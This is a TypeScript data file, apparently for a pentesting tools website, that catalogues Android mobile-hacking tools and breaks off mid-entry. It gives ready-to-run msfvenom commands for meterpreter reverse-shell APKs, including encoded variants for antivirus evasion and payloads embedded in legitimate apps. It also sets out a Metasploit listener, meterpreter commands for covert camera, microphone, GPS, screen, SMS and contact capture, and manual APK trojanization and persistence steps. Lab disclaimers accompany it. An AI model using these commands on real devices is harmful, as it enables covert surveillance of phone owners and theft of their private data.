interface Flag {
  flag: string
  description: string
}

interface Command {
  title: string
  syntax: string
  description: string
  example?: string
  flags?: Flag[]
}

interface ToolData {
  name: string
  slug: string
  category: string
  subcategory?: string
  description: string
  longDescription: string
  commands: Command[]
  useCases: string[]
  difficulty: 'Beginner' | 'Intermediate' | 'Advanced'
  tags: string[]
  relatedTools: string[]
  installCommand?: string
  featured?: boolean
}

export const toolsMobile: ToolData[] = [
  // ─────────────────────────────────────────────
  // MOBILE HACKING
  // ─────────────────────────────────────────────
  {
    name: 'msfvenom (Android)',
    slug: 'msfvenom-android',
    category: 'Mobile Hacking',
    subcategory: 'Payload Generation',
    featured: true,
    difficulty: 'Beginner',
    description:
      'Generate Android APK payloads with Metasploit\'s msfvenom — from basic reverse shells to encoded and embedded APKs for evasion research.',
    longDescription:
      'msfvenom is Metasploit\'s payload generation and encoding utility. For Android security research, it creates APK files containing meterpreter reverse shells that connect back to a listener on your Kali machine. The basic android/meterpreter/reverse_tcp payload produces a raw APK that modern antivirus will catch — making it ideal for understanding detection baselines. The -i (iterations) flag applies multiple encoding passes to transform payload bytes, making signature matching harder. The -x flag embeds the payload into a legitimate host APK: msfvenom decompiles both APKs, injects the meterpreter Dex code, patches AndroidManifest.xml to add required permissions and the meterpreter service, then rebuilds. Note: x86/shikata_ga_nai encoder does NOT work on Android — phones run ARM/Dalvik bytecode, not x86. Always verify generated APKs with "file" and "unzip -l" to confirm they are valid ZIP/APK structures before deploying to a test device. All testing must be performed on devices you own or have explicit written permission to test. Unauthorized use is a criminal offense under India IT Act 2000 (Sec 66), USA CFAA, and UK Computer Misuse Act 1990.',
    commands: [
      {
        title: 'Basic Android APK Payload',
        syntax: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -o /home/kali/evil.apk',
        description:
          'Generates a basic Android meterpreter reverse TCP payload as an APK file. This is the simplest form — no encoding applied. Antivirus will likely flag this, making it useful for baseline detection research.',
        example: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o /home/kali/evil.apk',
        flags: [
          { flag: '-p android/meterpreter/reverse_tcp', description: 'Android meterpreter payload type — establishes reverse TCP connection back to LHOST' },
          { flag: 'LHOST=<IP>', description: 'Your Kali Linux IP address — the address the payload will call back to' },
          { flag: 'LPORT=4444', description: 'Port on Kali to receive the connection — must match your listener' },
          { flag: '-o <path>', description: 'Output file path for the generated APK' },
        ],
      },
      {
        title: 'Encoded APK (Multiple Iterations)',
        syntax: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -i 10 -o /home/kali/iterated.apk',
        description:
          'Applies 10 encoding iterations to the payload. More passes transform the payload bytes further from known signatures, improving evasion in research contexts. This is the correct approach for Android — x86 encoders like shikata_ga_nai are architecture-incompatible with ARM/Dalvik.',
        example: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -i 10 -o /home/kali/iterated.apk',
        flags: [
          { flag: '-i 10', description: 'Number of encoding iterations — more passes increase evasion difficulty at the cost of APK size' },
        ],
      },
      {
        title: 'Embed Payload into Legitimate APK',
        syntax: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -x /home/kali/original.apk -o /home/kali/embedded.apk',
        description:
          'Injects the meterpreter payload into an existing legitimate APK. The host app functions normally while meterpreter runs silently in the background. msfvenom decompiles both APKs, merges the Dex code, patches the manifest with required permissions, and rebuilds. The resulting APK must be signed with apksigner before installation.',
        example: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /home/kali/calculator.apk -o /home/kali/embedded.apk',
        flags: [
          { flag: '-x <path>', description: 'Path to a legitimate host APK — payload is injected into this app, which continues to function normally' },
        ],
      },
      {
        title: 'Raw Format Output',
        syntax: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o /home/kali/payload.apk',
        description:
          'Outputs the payload in raw format explicitly. Equivalent to using R > file.apk redirection. Useful for scripting and pipeline integration.',
        example: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o /home/kali/payload.apk',
        flags: [
          { flag: '-f raw', description: 'Output format — raw outputs the payload bytes directly without additional wrapping' },
        ],
      },
      {
        title: 'Verify Generated APK',
        syntax: 'file /home/kali/evil.apk && ls -lh /home/kali/evil.apk && unzip -l /home/kali/evil.apk',
        description:
          'Confirms the generated APK is a valid ZIP/APK archive. A valid APK should report "Zip archive data", have a size of 8KB–100KB, and contain AndroidManifest.xml, classes.dex, and META-INF/ when listed.',
        example: 'file /home/kali/iterated.apk',
      },
      {
        title: 'List Available Android Payloads',
        syntax: 'msfvenom --list payloads | grep android',
        description:
          'Lists all Android-compatible payloads available in your Metasploit installation. Useful for troubleshooting or exploring payload variants.',
        example: 'msfvenom --list payloads | grep android',
      },
    ],
    useCases: [
      'Generate test APK payloads for Android security research on owned devices',
      'Study antivirus detection signatures by comparing plain vs encoded APK outputs',
      'Embed payloads into legitimate apps to understand trojanized APK attack vectors',
      'Demonstrate the risk of sideloading APKs from untrusted sources',
      'Practice complete mobile pentesting workflows from payload generation through post-exploitation',
    ],
    tags: ['android', 'mobile', 'apk', 'payload', 'meterpreter', 'msfvenom', 'metasploit', 'reverse-shell', 'evasion'],
    relatedTools: ['metasploit-android', 'meterpreter-android', 'apktool', 'apksigner', 'android-payload-delivery'],
    installCommand: 'sudo apt install metasploit-framework -y',
  },

  {
    name: 'ADB — Android Debug Bridge',
    slug: 'adb',
    category: 'Mobile Hacking',
    subcategory: 'Device Communication',
    featured: true,
    difficulty: 'Beginner',
    description:
      'The essential command-line tool for communicating with Android devices — install APKs, transfer files, open shells, and configure wireless debugging over USB or WiFi.',
    longDescription:
      'ADB (Android Debug Bridge) is the most important tool in Android security research. It is a client-server program that provides a communication channel between a development machine and an Android device. ADB operates over USB or TCP/IP (WiFi), enabling file transfer, APK installation, shell access, log capture, and port forwarding. Before ADB can connect over USB, the target device must have USB Debugging enabled in Developer Options — triggered by tapping Build Number 7 times. On Oppo/ColorOS devices the path is: Settings → About Phone → Software Information → Build Number. After connecting, the device shows an RSA key authorization popup that must be accepted. For WiFi ADB: run "adb tcpip 5555" while connected via USB, then "adb connect <phone-ip>:5555" and disconnect the cable. Key commands every Android security researcher must know: adb devices (list), adb install (deploy APK), adb push/pull (file transfer), adb shell (terminal access), adb uninstall (remove app), adb shell pm list packages (enumerate apps), adb shell getprop ro.product.cpu.abi (check CPU architecture for Frida server selection).',
    commands: [
      {
        title: 'List Connected Devices',
        syntax: 'adb devices',
        description:
          'Lists all Android devices currently connected via USB or WiFi ADB. Each device shows a serial number and status (device, unauthorized, offline). Run this first to confirm connection.',
        example: 'adb devices',
      },
      {
        title: 'Install APK',
        syntax: 'adb install /path/to/app.apk',
        description:
          'Installs an APK file onto the connected Android device. The device must have "Install via USB" enabled in Developer Options on Oppo/ColorOS.',
        example: 'adb install /home/kali/evil.apk',
        flags: [
          { flag: '-d', description: 'Allow version downgrade (install older version over newer)' },
          { flag: '-r', description: 'Reinstall app, keeping existing data' },
        ],
      },
      {
        title: 'Push File to Device',
        syntax: 'adb push <local-path> <remote-path>',
        description:
          'Copies a file from your Kali machine to the Android device. Use /sdcard/ for accessible storage without root.',
        example: 'adb push /home/kali/frida-server /data/local/tmp/frida-server',
      },
      {
        title: 'Pull File from Device',
        syntax: 'adb pull <remote-path> <local-path>',
        description:
          'Downloads a file or directory from the Android device to your Kali machine. Omit local path to pull into the current directory.',
        example: 'adb pull /sdcard/DCIM/Camera/photo.jpg /home/kali/',
      },
      {
        title: 'Open Interactive Shell',
        syntax: 'adb shell',
        description:
          'Opens an interactive Unix shell on the Android device. From here you can navigate the filesystem, run commands, and inspect the system. Type "exit" to return to Kali.',
        example: 'adb shell',
      },
      {
        title: 'Run Single Shell Command',
        syntax: 'adb shell <command>',
        description:
          'Executes a single command on the device without entering an interactive shell. Useful for scripting and quick queries.',
        example: 'adb shell getprop ro.build.version.release',
      },
      {
        title: 'Switch ADB to TCP/WiFi Mode',
        syntax: 'adb tcpip 5555',
        description:
          'Restarts the ADB daemon on the device in TCP mode listening on port 5555. Run this while connected via USB, then disconnect the cable and connect wirelessly.',
        example: 'adb tcpip 5555',
      },
      {
        title: 'Connect via WiFi',
        syntax: 'adb connect <PHONE_IP>:5555',
        description:
          'Connects to an Android device over WiFi. Both devices must be on the same network. Get the phone IP from Settings → WiFi → connected network details.',
        example: 'adb connect 192.168.1.8:5555',
      },
      {
        title: 'Disconnect WiFi ADB',
        syntax: 'adb disconnect',
        description:
          'Disconnects all wireless ADB connections. Use "adb disconnect <IP>:5555" to disconnect a specific device.',
        example: 'adb disconnect 192.168.1.8:5555',
      },
      {
        title: 'Uninstall App',
        syntax: 'adb uninstall <package-name>',
        description:
          'Removes an installed application by its package name. Essential for cleanup after lab sessions. The default Metasploit APK package name is com.metasploit.stage.',
        example: 'adb uninstall com.metasploit.stage',
      },
      {
        title: 'List Installed Packages',
        syntax: 'adb shell pm list packages',
        description:
          'Lists all installed package names on the device. Pipe with grep to filter results. Use -3 flag for third-party apps only.',
        example: 'adb shell pm list packages -3',
        flags: [
          { flag: '-3', description: 'Show only third-party (non-system) packages' },
          { flag: '-e', description: 'Show only enabled packages' },
          { flag: '-d', description: 'Show only disabled packages' },
        ],
      },
      {
        title: 'Get CPU Architecture',
        syntax: 'adb shell getprop ro.product.cpu.abi',
        description:
          'Returns the device CPU architecture (e.g., arm64-v8a, armeabi-v7a, x86, x86_64). Critical for selecting the correct frida-server binary — architecture mismatch causes frida-server to fail silently.',
        example: 'adb shell getprop ro.product.cpu.abi',
      },
      {
        title: 'Restart ADB Server',
        syntax: 'adb kill-server && adb start-server',
        description:
          'Kills and restarts the local ADB server. Use this when devices show "offline" status or ADB appears frozen.',
        example: 'adb kill-server && adb start-server && adb devices',
      },
    ],
    useCases: [
      'Deploy test APKs to Android devices for security research without using the Play Store',
      'Transfer frida-server binaries and other tools to device storage',
      'Enumerate installed packages to map attack surface and identify targets for analysis',
      'Access device shell for manual post-exploitation investigation and cleanup',
      'Switch between USB and WiFi ADB to match different lab scenarios',
    ],
    tags: ['android', 'mobile', 'adb', 'shell', 'usb', 'wifi', 'debug', 'install', 'apk'],
    relatedTools: ['msfvenom-android', 'frida-server', 'android-developer-options', 'android-payload-delivery'],
    installCommand: 'sudo apt install adb android-tools-adb android-tools-fastboot -y',
  },

  {
    name: 'Metasploit Android Handler',
    slug: 'metasploit-android',
    category: 'Mobile Hacking',
    subcategory: 'Exploitation',
    difficulty: 'Beginner',
    description:
      'Configure Metasploit\'s multi/handler to receive incoming Android meterpreter connections from APK payloads deployed on test devices.',
    longDescription:
      'After generating an Android payload APK with msfvenom and installing it on a test device, Metasploit\'s exploit/multi/handler acts as the listener that catches the incoming reverse TCP connection when the app is opened. The handler must be running and configured with matching LHOST and LPORT values before the payload app is launched on the device — the payload connects outbound, so if no listener is ready it silently fails. Start msfconsole first (requires PostgreSQL running: "sudo systemctl start postgresql"), load the multi/handler module, set the payload type to match what msfvenom generated, configure LHOST to your Kali IP (find it with "ip a | grep wlan0"), and run. The handler then waits for incoming connections. When the payload app is opened on the Android device, Metasploit displays "[*] Meterpreter session X opened" and drops you into a meterpreter prompt. Multiple sessions from different devices can be managed simultaneously. This setup is the foundation of all Android meterpreter post-exploitation work. All testing must be performed exclusively on devices you own or have explicit written permission to test.',
    commands: [
      {
        title: 'Start Metasploit Console',
        syntax: 'sudo msfconsole',
        description:
          'Launches the Metasploit Framework interactive console. Requires PostgreSQL to be running. Use "sudo systemctl start postgresql && sudo msfdb init" on first run.',
        example: 'sudo msfconsole',
      },
      {
        title: 'Load Multi Handler',
        syntax: 'use exploit/multi/handler',
        description:
          'Selects the generic multi/handler module, which can receive any type of reverse shell or meterpreter connection. This is the catch-all listener for all reverse payload types.',
        example: 'use exploit/multi/handler',
      },
      {
        title: 'Set Android Payload Type',
        syntax: 'set payload android/meterpreter/reverse_tcp',
        description:
          'Configures the handler to expect an Android meterpreter reverse TCP connection. This must match exactly what was used in msfvenom to generate the APK.',
        example: 'set payload android/meterpreter/reverse_tcp',
      },
      {
        title: 'Set Listener IP',
        syntax: 'set LHOST <YOUR_KALI_IP>',
        description:
          'Sets the IP address the handler listens on. Must be your Kali machine\'s IP on the same network as the test device. Find your IP with "ip a | grep wlan0".',
        example: 'set LHOST 192.168.1.5',
      },
      {
        title: 'Set Listener Port',
        syntax: 'set LPORT 4444',
        description:
          'Sets the TCP port to listen on. Must match the LPORT used during msfvenom payload generation. Default is 4444. Ensure no firewall blocks this port: "sudo ufw allow 4444".',
        example: 'set LPORT 4444',
      },
      {
        title: 'Start Listener',
        syntax: 'run',
        description:
          'Starts the handler and begins waiting for incoming connections. Displays "[*] Started reverse TCP handler on <IP>:<PORT>" then "[*] Waiting for connection..." Open the payload app on the test device to trigger the session.',
        example: 'run',
      },
      {
        title: 'One-Line Listener (Non-Interactive)',
        syntax: 'msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 4444; run"',
        description:
          'Launches msfconsole in quiet mode and immediately configures and starts the handler. Useful when scripting lab setup or running the listener in a second terminal while doing other work.',
        example: 'msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; run"',
      },
    ],
    useCases: [
      'Receive meterpreter sessions from Android APK payloads on test devices',
      'Manage multiple simultaneous sessions from different Android test devices',
      'Practice the full payload generation → delivery → listener → post-exploitation pipeline',
      'Understand how reverse shell callbacks work at a network level',
    ],
    tags: ['android', 'mobile', 'metasploit', 'meterpreter', 'reverse-tcp', 'handler', 'listener', 'exploit'],
    relatedTools: ['msfvenom-android', 'meterpreter-android', 'android-payload-delivery'],
    installCommand: 'sudo apt install metasploit-framework -y && sudo systemctl start postgresql && sudo msfdb init',
  },

  {
    name: 'Meterpreter (Android)',
    slug: 'meterpreter-android',
    category: 'Mobile Hacking',
    subcategory: 'Post-Exploitation',
    featured: true,
    difficulty: 'Intermediate',
    description:
      'Android Meterpreter post-exploitation commands — camera access, microphone recording, GPS location, screen capture, contact/SMS/call log extraction, and session management.',
    longDescription:
      'Android Meterpreter is the post-exploitation payload that runs on the target device after a session is established via exploit/multi/handler. It provides an advanced, interactive shell with capabilities far beyond a standard Unix shell: camera control (front and back), microphone recording, GPS geolocation, screen capture and live streaming, and extraction of personal data including contacts, SMS messages, and call logs. The webcam_list command enumerates available cameras — on most Android devices index 0 or 1 is the back camera and 1 or 2 is the front camera (varies by device). webcam_snap captures a single still image, webcam_stream opens a live video feed. record_mic captures audio for a specified duration in seconds. geolocate returns GPS coordinates and a Google Maps link if location permission was granted by the user. dump_contacts, dump_sms, and dump_calllog extract personal data to local files on Kali. check_root determines if the device is rooted, which enables deeper system access. Sessions can be backgrounded and resumed — sessions -l lists all active sessions, sessions -i N resumes session N. Always clean up after lab work: exit the session and uninstall the test APK with "adb uninstall com.metasploit.stage".',
    commands: [
      {
        title: 'List Cameras',
        syntax: 'webcam_list',
        description:
          'Enumerates all cameras available on the Android device. Returns each camera with an index number. Typically index 0 or 1 is the back (rear) camera and 1 or 2 is the front camera — varies by manufacturer.',
        example: 'webcam_list',
      },
      {
        title: 'Capture Photo (Back Camera)',
        syntax: 'webcam_snap -i 0',
        description:
          'Takes a still photo using the specified camera index and saves it to the Kali machine. Use webcam_list first to confirm which index corresponds to which camera on the test device.',
        example: 'webcam_snap -i 1',
        flags: [
          { flag: '-i <index>', description: 'Camera index from webcam_list output — 0/1 for back camera, 1/2 for front camera depending on device' },
          { flag: '-p <path>', description: 'Save path for the captured image on the Kali machine' },
        ],
      },
      {
        title: 'Live Camera Stream',
        syntax: 'webcam_stream',
        description:
          'Opens a live video stream from the device camera in a browser window on Kali. Use -i flag to select camera index. Ctrl+C to stop the stream.',
        example: 'webcam_stream -i 1',
        flags: [
          { flag: '-i <index>', description: 'Camera index to stream from' },
        ],
      },
      {
        title: 'Record Microphone Audio',
        syntax: 'record_mic -d <seconds>',
        description:
          'Records audio from the device microphone for the specified duration in seconds. The audio file is saved locally on Kali. Requires RECORD_AUDIO permission to have been granted to the payload app.',
        example: 'record_mic -d 10',
        flags: [
          { flag: '-d <seconds>', description: 'Recording duration in seconds' },
        ],
      },
      {
        title: 'Get GPS Location',
        syntax: 'geolocate',
        description:
          'Returns the device GPS coordinates and a Google Maps link showing the location. Requires ACCESS_FINE_LOCATION or ACCESS_COARSE_LOCATION permission. May fall back to network/WiFi-based location if GPS is unavailable.',
        example: 'geolocate',
      },
      {
        title: 'Take Screenshot',
        syntax: 'screenshot',
        description:
          'Captures the current screen content and saves it as an image file on Kali. Useful for seeing what app the user is currently viewing.',
        example: 'screenshot',
      },
      {
        title: 'Live Screen Share',
        syntax: 'screenshare',
        description:
          'Opens a live stream of the device screen in a browser on Kali. Shows everything visible on the device display in real time.',
        example: 'screenshare',
      },
      {
        title: 'Dump Contacts',
        syntax: 'dump_contacts',
        description:
          'Exports all contacts from the device address book to a file on Kali. Includes names, phone numbers, and email addresses. Requires READ_CONTACTS permission.',
        example: 'dump_contacts',
      },
      {
        title: 'Dump SMS Messages',
        syntax: 'dump_sms',
        description:
          'Extracts all SMS messages from the device (inbox, sent, and drafts) and saves them to a file on Kali. Requires READ_SMS permission.',
        example: 'dump_sms',
      },
      {
        title: 'Dump Call Log',
        syntax: 'dump_calllog',
        description:
          'Exports the device call history including incoming, outgoing, and missed calls with timestamps and durations.',
        example: 'dump_calllog',
      },
      {
        title: 'Device Information',
        syntax: 'sysinfo',
        description:
          'Returns device information including model name, Android version, and architecture. Equivalent to running multiple adb shell getprop commands.',
        example: 'sysinfo',
      },
      {
        title: 'Get Current User',
        syntax: 'getuid',
        description:
          'Displays the user context the payload is running under (e.g., u0_a123). Shows current privilege level — useful before attempting privilege escalation.',
        example: 'getuid',
      },
      {
        title: 'Check Root Status',
        syntax: 'check_root',
        description:
          'Determines whether the Android device is rooted. A rooted device allows deeper system access including reading app databases, modifying system files, and running commands as root.',
        example: 'check_root',
      },
      {
        title: 'Battery Status',
        syntax: 'battery_status',
        description:
          'Returns the current battery level and charging status of the device.',
        example: 'battery_status',
      },
      {
        title: 'Open Android Shell',
        syntax: 'shell',
        description:
          'Drops into a standard Android Unix shell from within the meterpreter session. Type "exit" to return to the meterpreter prompt.',
        example: 'shell',
      },
      {
        title: 'Background Session',
        syntax: 'background',
        description:
          'Sends the current meterpreter session to the background without closing it. Use "sessions -i <N>" to return to it later.',
        example: 'background',
      },
      {
        title: 'List All Sessions',
        syntax: 'sessions -l',
        description:
          'Lists all currently open meterpreter sessions with their IDs, types, and connection details. Run from the msfconsole prompt after backgrounding a session.',
        example: 'sessions -l',
        flags: [
          { flag: '-l', description: 'List all active sessions' },
          { flag: '-i <N>', description: 'Interact with (resume) session number N' },
          { flag: '-k <N>', description: 'Kill session number N' },
        ],
      },
      {
        title: 'Resume a Session',
        syntax: 'sessions -i <N>',
        description:
          'Resumes interaction with a backgrounded meterpreter session by its ID number as shown in sessions -l.',
        example: 'sessions -i 1',
      },
    ],
    useCases: [
      'Understand the full scope of post-exploitation capabilities on Android for threat modeling and defense',
      'Study which permissions are required for each meterpreter capability to guide secure app design',
      'Practice camera and microphone access vectors to understand why these permissions are sensitive',
      'Extract test data from owned devices to verify backup/data exposure risks',
      'Learn session management for handling multiple devices in a lab environment',
    ],
    tags: ['android', 'mobile', 'meterpreter', 'post-exploitation', 'camera', 'gps', 'sms', 'contacts', 'metasploit'],
    relatedTools: ['metasploit-android', 'msfvenom-android', 'android-persistence'],
  },

  {
    name: 'APKTool',
    slug: 'apktool',
    category: 'Mobile Hacking',
    subcategory: 'Reverse Engineering',
    difficulty: 'Intermediate',
    description:
      'Decompile Android APKs to Smali bytecode and resources, modify them, then rebuild and resign — enabling APK analysis, manifest patching, and payload embedding.',
    longDescription:
      'APKTool is the standard tool for Android APK reverse engineering. It decodes APK resources to their near-original form (Smali bytecode, AndroidManifest.xml, layouts, strings) and allows rebuilding the modified APK. APKs are ZIP archives containing a DEX (Dalvik Executable) file with compiled Java bytecode — APKTool converts this to human-readable Smali assembly. The decompile command (apktool d) extracts everything into a directory. After modification, the build command (apktool b) rebuilds the APK. A rebuilt APK must be signed with apksigner before Android will install it. Key use cases: reading AndroidManifest.xml to audit permissions, analyzing smali code to understand app behavior, injecting payload smali files into legitimate apps for embedding research, adding BOOT_COMPLETED receivers for persistence research, and patching manifest permissions. When manually embedding a payload: decompile both APKs, copy payload smali directory into the original app smali folder, add the meterpreter service and permissions to the manifest, add the Payload.start() call to MainActivity\'s onCreate in smali, then rebuild and sign.',
    commands: [
      {
        title: 'Decompile APK',
        syntax: 'apktool d <app.apk> -o <output-dir/>',
        description:
          'Decodes the APK into Smali code, AndroidManifest.xml, and all resources. The output directory contains everything needed to analyze or modify the app.',
        example: 'apktool d /home/kali/app.apk -o /home/kali/decompiled/',
        flags: [
          { flag: '-o <dir>', description: 'Output directory for decompiled files (created if it does not exist)' },
          { flag: '-f', description: 'Force overwrite if output directory already exists' },
          { flag: '-r', description: 'Do not decode resources — faster, only decodes Smali' },
        ],
      },
      {
        title: 'Rebuild APK',
        syntax: 'apktool b <decompiled-dir/> -o <rebuilt.apk>',
        description:
          'Recompiles the Smali code and resources back into an APK file. The output APK is unsigned — it must be signed with apksigner before Android will accept it for installation.',
        example: 'apktool b /home/kali/decompiled/ -o /home/kali/rebuilt.apk',
        flags: [
          { flag: '-o <file>', description: 'Output path for the rebuilt APK' },
        ],
      },
      {
        title: 'Check APK Version',
        syntax: 'apktool --version',
        description:
          'Displays the installed APKTool version. Keep APKTool updated as newer APK formats may not decompile correctly with older versions.',
        example: 'apktool --version',
      },
      {
        title: 'Inspect Manifest After Decompile',
        syntax: 'cat <decompiled-dir>/AndroidManifest.xml',
        description:
          'Reads the decoded AndroidManifest.xml. This file declares all permissions, activities, services, receivers, and intent filters — essential for understanding app capabilities and injection points.',
        example: 'cat /home/kali/decompiled/AndroidManifest.xml',
      },
      {
        title: 'Search Smali for Camera Usage',
        syntax: 'grep -r "camera" <decompiled-dir>/smali/ -i',
        description:
          'Searches all Smali files for camera API references. Helps map which classes interact with the camera hardware for analysis or hook targeting.',
        example: 'grep -r "CameraManager\\|openCamera" /home/kali/decompiled/smali/ -i',
      },
    ],
    useCases: [
      'Audit Android app permissions by reading the decoded AndroidManifest.xml',
      'Analyze Smali bytecode to understand how an app processes sensitive data',
      'Manually embed meterpreter payload into a legitimate APK for research on trojanized app vectors',
      'Add BOOT_COMPLETED broadcast receivers for Android persistence research',
      'Patch app behavior in a lab environment to test security controls',
    ],
    tags: ['android', 'mobile', 'apk', 'reverse-engineering', 'smali', 'manifest', 'decompile', 'recompile'],
    relatedTools: ['apksigner', 'msfvenom-android', 'frida', 'android-persistence'],
    installCommand: 'sudo apt install apktool -y',
  },

  {
    name: 'apksigner',
    slug: 'apksigner',
    category: 'Mobile Hacking',
    subcategory: 'APK Signing',
    difficulty: 'Intermediate',
    description:
      'Sign rebuilt or modified Android APKs with a test keystore so Android will accept them for installation — required after any APKTool rebuild or manual APK modification.',
    longDescription:
      'Android requires every APK to be cryptographically signed before installation. When you rebuild a decompiled APK with APKTool or manually modify one, the original signature is invalidated. apksigner (part of Android SDK Build Tools) signs APKs using a keystore file containing a private key and certificate. The process has two steps: first generate a test keystore with keytool (a one-time setup), then sign the APK with apksigner. The keystore stores your signing identity — for lab work the credentials can be anything since you\'re installing via ADB (not the Play Store). After signing, use "apksigner verify" to confirm the signature is valid before attempting installation. Note: if installing over an existing app with a different signature, Android will reject the install — uninstall the original first. apksigner supports both v1 (JAR signing) and v2/v3 (APK Signature Scheme) — v1 is sufficient for most lab scenarios. The tool ships with Android SDK but is also available as a standalone Kali package.',
    commands: [
      {
        title: 'Generate Test Keystore (One-Time)',
        syntax: 'keytool -genkey -v -keystore /home/kali/test.keystore -alias testkey -keyalg RSA -keysize 2048 -validity 10000',
        description:
          'Creates a new RSA keystore file for signing APKs. Run once and reuse for all lab APKs. Prompts for a password and certificate details — any values work for lab use. Use the -storepass and -keypass flags with -dname to run non-interactively.',
        example: 'keytool -genkey -v -keystore /home/kali/test.keystore -alias testkey -keyalg RSA -keysize 2048 -validity 10000 -storepass password123 -keypass password123 -dname "CN=Test, OU=Test, O=Test, L=Test, S=Test, C=US"',
        flags: [
          { flag: '-keystore <path>', description: 'Path to create the keystore file' },
          { flag: '-alias <name>', description: 'Alias name for the key entry within the keystore' },
          { flag: '-keyalg RSA', description: 'Key algorithm — RSA is the standard for Android signing' },
          { flag: '-keysize 2048', description: 'Key size in bits — 2048 is minimum recommended' },
          { flag: '-validity 10000', description: 'Certificate validity period in days (~27 years)' },
          { flag: '-storepass <pass>', description: 'Keystore password (non-interactive)' },
          { flag: '-keypass <pass>', description: 'Key password (non-interactive)' },
          { flag: '-dname <dn>', description: 'Distinguished name for the certificate (non-interactive)' },
        ],
      },
      {
        title: 'Sign APK',
        syntax: 'apksigner sign --ks <keystore> --ks-key-alias <alias> --ks-pass pass:<pass> --key-pass pass:<pass> --out <signed.apk> <unsigned.apk>',
        description:
          'Signs the unsigned APK with the specified keystore and outputs a new signed APK file. The unsigned input file is unchanged — the signed output is a separate file.',
        example: 'apksigner sign --ks /home/kali/test.keystore --ks-key-alias testkey --ks-pass pass:password123 --key-pass pass:password123 --out /home/kali/signed.apk /home/kali/rebuilt.apk',
        flags: [
          { flag: '--ks <path>', description: 'Path to the keystore file' },
          { flag: '--ks-key-alias <alias>', description: 'Alias of the key within the keystore to sign with' },
          { flag: '--ks-pass pass:<pass>', description: 'Keystore password prefixed with "pass:"' },
          { flag: '--key-pass pass:<pass>', description: 'Key entry password prefixed with "pass:"' },
          { flag: '--out <path>', description: 'Output path for the signed APK' },
        ],
      },
      {
        title: 'Verify APK Signature',
        syntax: 'apksigner verify <signed.apk>',
        description:
          'Verifies that the APK is properly signed. Outputs "Verified using v1 scheme: true" (and v2/v3 if applicable). A missing or invalid signature causes Android to reject installation.',
        example: 'apksigner verify /home/kali/signed.apk',
      },
    ],
    useCases: [
      'Sign rebuilt APKs after APKTool modification for installation on test devices',
      'Understand Android\'s APK signing requirement as a security mechanism',
      'Create test keystores for repeated lab APK signing without re-entering credentials',
      'Verify APK signatures before attempting installation to catch signing errors early',
    ],
    tags: ['android', 'mobile', 'apk', 'signing', 'keystore', 'keytool', 'apksigner'],
    relatedTools: ['apktool', 'msfvenom-android', 'android-persistence'],
    installCommand: 'sudo apt install apksigner -y',
  },

  {
    name: 'Frida',
    slug: 'frida',
    category: 'Mobile Hacking',
    subcategory: 'Dynamic Instrumentation',
    featured: true,
    difficulty: 'Advanced',
    description:
      'Dynamic instrumentation toolkit for injecting JavaScript into running Android apps to intercept, monitor, or block any Java method call at runtime — without modifying the APK.',
    longDescription:
      `Frida is a dynamic code instrumentation framework that lets you inject JavaScript snippets into running processes on Android (and iOS, Windows, macOS, Linux). Unlike static analysis tools, Frida operates on a live running app — no APK modification required. It works by injecting a JavaScript engine into the target process and exposing Java.use() to hook any class and method.

**Architecture:** Frida has two components that must match in version exactly: frida-tools (installed on Kali via pip3) and frida-server (a binary that runs on the Android device). Download frida-server matching your Kali frida version and your phone's CPU architecture from github.com/frida/frida/releases. Version mismatch produces: "Failed to attach: unable to connect to remote frida-server".

**Key commands:**
- frida --version — check installed version
- frida-ps -U — list all running processes on USB-connected device
- frida -U -f com.package -l script.js --no-pause — spawn app and immediately apply hook
- frida-ps -U | grep camera — find camera app process name

**Hook Script 1 — Detect Camera Opens (camera_detect.js):**
\`\`\`javascript
Java.perform(function() {
    var CameraManager = Java.use('android.hardware.camera2.CameraManager');
    CameraManager.openCamera.overload(
        'java.lang.String',
        'android.hardware.camera2.CameraDevice$StateCallback',
        'android.os.Handler'
    ).implementation = function(cameraId, callback, handler) {
        console.log('[CAMERA OPENED] Camera ID: ' + cameraId);
        console.log('Timestamp: ' + new Date().toISOString());
        var stack = Java.use('java.lang.Thread').currentThread().getStackTrace();
        for (var i = 0; i < Math.min(stack.length, 8); i++) {
            console.log('  ' + stack[i].toString());
        }
        return this.openCamera(cameraId, callback, handler);
    };
    console.log('[*] camera_detect.js loaded');
});
\`\`\`

**Hook Script 2 — Intercept Camera Frames (camera_intercept.js):**
\`\`\`javascript
Java.perform(function() {
    var ImageReader = Java.use('android.media.ImageReader');
    ImageReader.acquireLatestImage.implementation = function() {
        var image = this.acquireLatestImage();
        if (image !== null) {
            var planes = image.getPlanes();
            var buffer = planes[0].getBuffer();
            var bytes = Java.array('byte', new Array(buffer.remaining()).fill(0));
            buffer.get(bytes);
            console.log('[FRAME] Size: ' + bytes.length + ' bytes | Timestamp: ' + image.getTimestamp());
        }
        return image;
    };
    console.log('[*] camera_intercept.js loaded');
});
\`\`\`

**Hook Script 3 — Block Camera Access (camera_block.js):**
\`\`\`javascript
Java.perform(function() {
    var CameraManager = Java.use('android.hardware.camera2.CameraManager');
    CameraManager.openCamera.overload(
        'java.lang.String',
        'android.hardware.camera2.CameraDevice$StateCallback',
        'android.os.Handler'
    ).implementation = function(cameraId, callback, handler) {
        console.log('[BLOCKED] Camera open intercepted! Camera ID: ' + cameraId);
        var CameraAccessException = Java.use('android.hardware.camera2.CameraAccessException');
        callback.onError(null, CameraAccessException.CAMERA_DISABLED.value);
    };
    console.log('[*] camera_block.js active');
});
\`\`\``,
    commands: [
      {
        title: 'Check Frida Version',
        syntax: 'frida --version',
        description:
          'Displays the installed Frida version on Kali. This must match the frida-server version pushed to the Android device exactly. Note the output before downloading frida-server.',
        example: 'frida --version',
      },
      {
        title: 'List Running Processes on Device',
